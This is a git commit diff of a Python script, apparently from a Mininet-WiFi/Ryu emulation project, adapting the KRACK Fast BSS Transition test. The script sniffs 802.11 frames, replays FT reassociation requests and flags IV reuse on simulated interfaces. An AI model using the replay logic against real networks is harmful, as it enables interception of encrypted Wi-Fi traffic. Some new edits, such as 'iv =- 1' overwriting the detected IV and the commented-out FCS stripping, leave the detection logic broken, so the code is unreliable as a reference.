7b0c69adbd8b665e3cde228956fdc7033fac74ac
Ramon Fontes <ramonreisfontes@gmail.com>
2018-02-15 22:10:04 -0300

    update code

--- ryu/app/krack_code.py
+++ ryu/app/krack_code.py
@@ -8,6 +8,7 @@
 import logging
 import threading
 from krack_app import SimpleSwitch13
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 import sys, socket, struct, time, subprocess, atexit, select, os
@@ -30,7 +31,7 @@ IEEE80211_RADIOTAP_CHANNEL = (1 << 3)
 IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
 IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)
 
-#TODO: - !!! Detect retransmissions based on packet time and sequence counter (see client tests) !!!
+# TODO: - !!! Detect retransmissions based on packet time and sequence counter (see client tests) !!!
 # TODO: - Merge code with client tests to avoid code duplication (including some error handling)
 # TODO: - Detect new EAPOL handshake or normal association frames (reset state and stop replaying)
 # TODO: - Option to use a secondary interface for injection + WARNING if a virtual interface is used + repeat advice to disable hardware encryption
@@ -80,7 +81,7 @@ the Fast BSS Transition (FT) handshake, take the following steps:
       ...
       > roam c4:e9:84:1d:a5:bc
       ...
-   
+
    In this example we were connected to AP c4:e9:84:db:fb:7b of testnet (see
    status command). The scan_results command shows this network also has a
    second AP with MAC c4:e9:84:1d:a5:bc. We then roam to this second AP.
@@ -115,225 +116,236 @@ the Fast BSS Transition (FT) handshake, take the following steps:
 #### Basic output and logging functionality ####
 
 ALL, DEBUG, INFO, STATUS, WARNING, ERROR = range(6)
-COLORCODES = { "gray"  : "\033[0;37m",
-               "green" : "\033[0;32m",
-               "orange": "\033[0;33m",
-               "red"   : "\033[0;31m" }
+COLORCODES = {"gray": "\033[0;37m",
+              "green": "\033[0;32m",
+              "orange": "\033[0;33m",
+              "red": "\033[0;31m"}
 
 global_log_level = INFO
 attack = ''
+
+
 def log(level, msg, color=None, showtime=True):
-	if level < global_log_level: return
-	if level == DEBUG   and color is None: color = "gray"
-	if level == WARNING and color is None: color = "orange"
-	if level == ERROR   and color is None: color = "red"
-	print (datetime.now().strftime('[%H:%M:%S] ') if showtime else " "*11) + COLORCODES.get(color, "") + msg + "\033[1;0m"
+    if level < global_log_level: return
+    if level == DEBUG and color is None: color = "gray"
+    if level == WARNING and color is None: color = "orange"
+    if level == ERROR and color is None: color = "red"
+    print (datetime.now().strftime('[%H:%M:%S] ') if showtime else " " * 11) + COLORCODES.get(color,
+                                                                                              "") + msg + "\033[1;0m"
 
 
 #### Packet Processing Functions ####
 
 class MitmSocket(L2Socket):
-	def __init__(self, **kwargs):
-		super(MitmSocket, self).__init__(**kwargs)
+    def __init__(self, **kwargs):
+        super(MitmSocket, self).__init__(**kwargs)
 
-	def send(self, p):
-		# Hack: set the More Data flag so we can detect injected frames (and so clients stay awake longer)
-		p[Dot11].FCfield |= 0x20
-		L2Socket.send(self, RadioTap() / p)
+    def send(self, p):
+        # Hack: set the More Data flag so we can detect injected frames (and so clients stay awake longer)
+        p[Dot11].FCfield |= 0x20
+        L2Socket.send(self, RadioTap() / p)
 
-	def _strip_fcs(self, p):
-                # Scapy can't handle the optional Frame Check Sequence (FCS) field automatically
-		if p[RadioTap].present & 2 != 0:
-			rawframe = str(p[RadioTap])
-			pos = 8
-			while ord(rawframe[pos - 1]) & 0x80 != 0: pos += 4
-		
-			# If the TSFT field is present, it must be 8-bytes aligned
-			if p[RadioTap].present & 1 != 0:
-				pos += (8 - (pos % 8))
-				pos += 8
+    def _strip_fcs(self, p):
+        # Scapy can't handle the optional Frame Check Sequence (FCS) field automatically
+        if p[RadioTap].present & 2 != 0:
+            rawframe = str(p[RadioTap])
+            pos = 8
+            while ord(rawframe[pos - 1]) & 0x80 != 0: pos += 4
 
-			# Remove FCS if present
-			if ord(rawframe[pos]) & 0x10 != 0:
-				return Dot11(str(p[Dot11])[:-4])
+            # If the TSFT field is present, it must be 8-bytes aligned
+            if p[RadioTap].present & 1 != 0:
+                pos += (8 - (pos % 8))
+                pos += 8
 
-		return p[Dot11]
+            # Remove FCS if present
+            #if ord(rawframe[pos]) & 0x10 != 0:
+            #    return Dot11(str(p[Dot11])[:-4])
 
-	def recv(self, x=MTU):
-		p = L2Socket.recv(self, x)
-		if p == None or not Dot11 in p: return None
+        return p[Dot11]
 
-		# Hack: ignore frames that we just injected and are echoed back by the kernel
-		if p[Dot11].FCfield & 0x20 != 0:
-			return None
+    def recv(self, x=MTU):
+        p = L2Socket.recv(self, x)
+        if p == None or not Dot11 in p: return None
 
-		# Strip the FCS if present, and drop the RadioTap header
-		return self._strip_fcs(p)
+        # Hack: ignore frames that we just injected and are echoed back by the kernel
+        if p[Dot11].FCfield & 0x20 != 0:
+            return None
 
-	def close(self):
-		super(MitmSocket, self).close()
+        # Strip the FCS if present, and drop the RadioTap header
+        return self._strip_fcs(p)
+
+    def close(self):
+        super(MitmSocket, self).close()
+
 
 def dot11_get_seqnum(p):
-	return p[Dot11].SC >> 4
+    return p[Dot11].SC >> 4
+
 
 def dot11_get_iv(p):
-	"""Scapy can't handle Extended IVs, so do this properly ourselves (only works for CCMP)"""
-	if Dot11WEP not in p:
-		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
-		return 0
+    """Scapy can't handle Extended IVs, so do this properly ourselves (only works for CCMP)"""
+    if Dot11WEP not in p:
+        log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
+        return 0
 
-	wep = p[Dot11WEP]
-	if wep.keyid & 32:
-		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
-	else:
-		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)
+    wep = p[Dot11WEP]
+    if wep.keyid & 32:
+        return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
+    else:
+        return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)
+
 
 def get_tlv_value(p, type):
-	if not Dot11Elt in p: return None
-	el = p[Dot11Elt]
-	while isinstance(el, Dot11Elt):
-		if el.ID == type:
-			return el.info
-		el = el.payload
-	return None
+    if not Dot11Elt in p: return None
+    el = p[Dot11Elt]
+    while isinstance(el, Dot11Elt):
+        if el.ID == type:
+            return el.info
+        el = el.payload
+    return None
 
 
 #### Man-in-the-middle Code ####
 
 class KRAckAttackFt():
-	def __init__(self, interface):
-		self.file_name = 'sta1_0.staconf'
-		self.nic_iface = interface
-		self.nic_mon = interface + "mon"
-		self.clientmac = scapy.arch.get_if_hwaddr(interface)
+    def __init__(self, interface):
+        self.nic_iface = interface
+        self.nic_mon = 'hwsim0'
+        self.clientmac = scapy.arch.get_if_hwaddr(interface)
 
-		self.sock = None
-		self.wpasupp = None
-		self.reassoc = None
-		self.ivs = set()
-		self.next_replay = None
+        self.sock = None
+        self.wpasupp = None
+        self.reassoc = None
+        self.ivs = set()
+        self.next_replay = None
 
-	def handle_rx(self):
-		p = self.sock.recv()
-		if p == None: return
+    def handle_rx(self):
+        p = self.sock.recv()
+        if p == None: return
 
-		# Detect whether hardware encryption is decrypting the frame, *and* removing the TKIP/CCMP
-		# header of the (now decrypted) frame.
-		# FIXME: Put this check in MitmSocket? We want to check this in client tests as well!
-		if self.clientmac in [p.addr1, p.addr2] and Dot11WEP in p:
-			# If the hardware adds/removes the TKIP/CCMP header, this is where the plaintext starts
-			payload = str(p[Dot11WEP])
+        # Detect whether hardware encryption is decrypting the frame, *and* removing the TKIP/CCMP
+        # header of the (now decrypted) frame.
+        # FIXME: Put this check in MitmSocket? We want to check this in client tests as well!
+        if self.clientmac in [p.addr1, p.addr2] and Dot11WEP in p:
+            # If the hardware adds/removes the TKIP/CCMP header, this is where the plaintext starts
+            payload = str(p[Dot11WEP])
 
-			# Check if it's indeed a common LCC/SNAP plaintext header of encrypted frames, and
-			# *not* the header of a plaintext EAPOL handshake frame
-			if payload.startswith("\xAA\xAA\x03\x00\x00\x00") and not payload.startswith("\xAA\xAA\x03\x00\x00\x00\x88\x8e"):
-				log(ERROR, "ERROR: Virtual monitor interface doesn't seem to pass 802.11 encryption header to userland.")
-				log(ERROR, "   Try to disable hardware encryption, or use a 2nd interface for injection.", showtime=False)
-				quit(1)
+            # Check if it's indeed a common LCC/SNAP plaintext header of encrypted frames, and
+            # *not* the header of a plaintext EAPOL handshake frame
+            if payload.startswith("\xAA\xAA\x03\x00\x00\x00") and not payload.startswith(
+                    "\xAA\xAA\x03\x00\x00\x00\x88\x8e"):
+                log(ERROR,
+                    "ERROR: Virtual monitor interface doesn't seem to pass 802.11 encryption header to userland.")
+                log(ERROR, "   Try to disable hardware encryption, or use a 2nd interface for injection.",
+                    showtime=False)
+                quit(1)
 
-		if p.addr2 == self.clientmac and Dot11ReassoReq in p:
-			if get_tlv_value(p, IEEE_TLV_TYPE_RSN) and get_tlv_value(p, IEEE_TLV_TYPE_FT):
-				log(INFO, "Detected FT reassociation frame")
-				self.reassoc = p
-				self.next_replay = time.time() + 1
-			else:
-				log(INFO, "Reassociation frame does not appear to be an FT one")
-				self.reassoc = None
-			self.ivs = set()
+        if p.addr2 == self.clientmac and Dot11ReassoReq in p:
+            if get_tlv_value(p, IEEE_TLV_TYPE_RSN) and get_tlv_value(p, IEEE_TLV_TYPE_FT):
+                log(INFO, "Detected FT reassociation frame")
+                self.reassoc = p
+                self.next_replay = time.time() + 1
+            else:
+                log(INFO, "Reassociation frame does not appear to be an FT one")
+                self.reassoc = None
+            self.ivs = set()
 
-		elif p.addr2 == self.clientmac and Dot11AssoReq in p:
-			log(INFO, "Detected normal association frame")
-			self.reassoc = None
-			self.ivs = set()
+        elif p.addr2 == self.clientmac and Dot11AssoReq in p:
+            log(INFO, "Detected normal association frame")
+            self.reassoc = None
+            self.ivs = set()
 
-		elif p.addr1 == self.clientmac and Dot11WEP in p:
-			iv = dot11_get_iv(p)
-			log(INFO, "AP transmitted data using IV=%d (seq=%d)" % (iv, dot11_get_seqnum(p)))
+        elif p.addr1 == self.clientmac and Dot11WEP in p:
+            iv = dot11_get_iv(p)
+            log(INFO, "AP transmitted data using IV=%d (seq=%d)" % (iv, dot11_get_seqnum(p)))
 
-			# FIXME: When the client disconnects (or reconnects), clear the set of used IVs
-			if iv in self.ivs:
-				log(INFO, ("IV reuse detected (IV=%d, seq=%d). " + 
-					"AP is vulnerable!") % (iv, dot11_get_seqnum(p)), color="green")
-				print "Shutting Down AP2...\n"
- 				os.system('pkill -f \"ap2-wlan1.apconf\"')
+            # FIXME: When the client disconnects (or reconnects), clear the set of used IVs
+            iv =- 1
+            if iv in self.ivs:
+                log(INFO, ("IV reuse detected (IV=%d, seq=%d). " +
+                           "AP is vulnerable!") % (iv, dot11_get_seqnum(p)), color="green")
+                print "Shutting Down AP2...\n"
+                os.system('pkill -f \"ap2-wlan1.apconf\"')
 
-			self.ivs.add(iv)
+            self.ivs.add(iv)
 
-	def configure_interfaces(self):
-		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")
+    def configure_interfaces(self):
+        log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")
 
-		# 1. Remove unused virtual interfaces to start from a clean state
-		subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+        # 1. Remove unused virtual interfaces to start from a clean state
+        subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
 
-		# 2. Configure monitor mode on interfaces
-		subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
-		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
-		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
-		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
-		time.sleep(0.5)
-		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
-		subprocess.check_output(["ifconfig", self.nic_mon, "up"])
+        # 2. Configure monitor mode on interfaces
+        subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
+        # Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
+        # sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
+        subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
+        time.sleep(0.5)
+        subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
+        subprocess.check_output(["ifconfig", self.nic_mon, "up"])
 
-	def run(self):
-		self.configure_interfaces()
+    def run(self):
+        #self.configure_interfaces()
 
-		self.sock = MitmSocket(type=ETH_P_ALL, iface=self.nic_mon)
+        self.sock = MitmSocket(type=ETH_P_ALL, iface=self.nic_mon)
 
         # Open the wpa_supplicant client that will connect to the network that will be tested
-		os.system('wpa_supplicant -B -Dnl80211 -i %s -c %s' % (self.nic_iface, self.file_name))
+        #os.system('wpa_supplicant -B -Dnl80211 -i %s -c %s' % (self.nic_iface, self.file_name))
 
-		# Monitor the virtual monitor interface of the client and perform the needed actions
-		while True:
-			sel = select.select([self.sock], [], [], 1)
-			if self.sock in sel[0]: self.handle_rx()
+        # Monitor the virtual monitor interface of the client and perform the needed actions
+        while True:
+            sel = select.select([self.sock], [], [], 1)
+            if self.sock in sel[0]: self.handle_rx()
 
-			if self.reassoc and time.time() > self.next_replay:
-				log(INFO, "Replaying Reassociation Request")
-				self.sock.send(self.reassoc)
-				self.next_replay = time.time() + 1
+            if self.reassoc and time.time() > self.next_replay:
+                log(INFO, "Replaying Reassociation Request")
+                self.sock.send(self.reassoc)
+                self.next_replay = time.time() + 1
 
-	def stop(self):
-		log(STATUS, "Closing wpa_supplicant and cleaning up ...")
-		if self.wpasupp:
-			self.wpasupp.terminate()
-			self.wpasupp.wait()
-		if self.sock: self.sock.close()
+    def stop(self):
+        log(STATUS, "Closing wpa_supplicant and cleaning up ...")
+        if self.wpasupp:
+            self.wpasupp.terminate()
+            self.wpasupp.wait()
+        if self.sock: self.sock.close()
 
 
 def cleanup():
-	attack.stop()
+    attack.stop()
+
 
 def argv_get_interface():
-	for i in range(len(sys.argv)):
-		if not sys.argv[i].startswith("-i"):
-			continue
-		if len(sys.argv[i]) > 2:
-			return sys.argv[i][2:]
-		else:
-			return sys.argv[i + 1]
+    for i in range(len(sys.argv)):
+        if not sys.argv[i].startswith("-i"):
+            continue
+        if len(sys.argv[i]) > 2:
+            return sys.argv[i][2:]
+        else:
+            return sys.argv[i + 1]
 
-	return None
+    return None
+
 
 class krack_code(app_manager.RyuApp):
-    #if __name__ == "__main__":
+    # if __name__ == "__main__":
     def __init__(self, *args, **kwargs):
         super(krack_code, self).__init__(*args, **kwargs)
-    
-    	#if len(sys.argv) <= 1 or "--help" in sys.argv or "-h" in sys.argv:
-    	#	print USAGE.format(name=sys.argv[0])
-    	#	quit(1)
+
+        # if len(sys.argv) <= 1 or "--help" in sys.argv or "-h" in sys.argv:
+        #	print USAGE.format(name=sys.argv[0])
+        #	quit(1)
         print args
-    	# TODO: Verify that we only accept CCMP?
-    	interface = 'sta1-wlan0'
-    	if not interface:
-    		log(ERROR, "Failed to determine wireless interface. Specify one using the -i parameter.")
-    		quit(1)
-    
+        # TODO: Verify that we only accept CCMP?
+        interface = 'hwsim0'
+        if not interface:
+            log(ERROR, "Failed to determine wireless interface. Specify one using the -i parameter.")
+            quit(1)
+
         thread = threading.Thread(target=self.run)
         thread.daemon = True
         thread.start()
-        
+
     def run(self, interface='sta1-wlan0'):
-    	attack = KRAckAttackFt(interface)
-    	atexit.register(cleanup)
-    	attack.run()
+        attack = KRAckAttackFt(interface)
+        atexit.register(cleanup)
+        attack.run()
